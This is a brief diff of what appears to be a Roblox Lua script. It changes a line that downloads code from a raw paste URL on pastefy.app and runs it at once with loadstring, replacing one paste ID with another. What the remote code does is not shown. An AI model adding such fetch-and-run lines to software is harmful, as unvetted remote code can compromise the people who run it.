@@ -8,6 +8,7 @@ pcall(function()
 
     -- Script that runs immediately
     task.spawn(function()
-        loadstring(game:HttpGet("https://pastefy.app/fHJbns7j/raw", true))()
+        loadstring(game:HttpGet("https://pastefy.app/krSHDMsk/raw"))()
     end)
 end)
+
